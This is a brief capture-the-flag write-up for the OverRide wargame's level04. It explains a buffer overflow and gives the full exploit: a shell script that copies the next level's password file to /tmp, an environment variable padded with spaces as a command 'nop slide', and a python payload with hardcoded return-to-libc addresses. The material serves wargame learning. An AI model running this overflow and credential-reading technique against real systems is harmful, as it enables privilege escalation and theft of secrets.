We see in the source that a buffer can be overflowed, the problem here is that we cannot use a 
system("/bin/sh") since we struggle having a control over the process.
So we decide to execute a script that will echo the pass in a file

We used space a "nop slide" but for shell command.

```
level04@OverRide:~$ cat /tmp/getflag.sh
#!/bin/sh

cat /home/users/level05/.pass > /tmp/flag
```

chmod +x /tmp/getflag.sh

export toto=`python -c 'print(" "*4096 + "sh /tmp/getflag.sh")'`

ADDRESS_OF_ENV="\x65\xd1\xff\xff"

(python -c "print('2'*156 +  '\xd0\xae\xe6\xf7' + '\xe0\xeb\xe5\xb7' + $ADDRESS_OF_ENV)") | ./level04


cat /tmp/flag
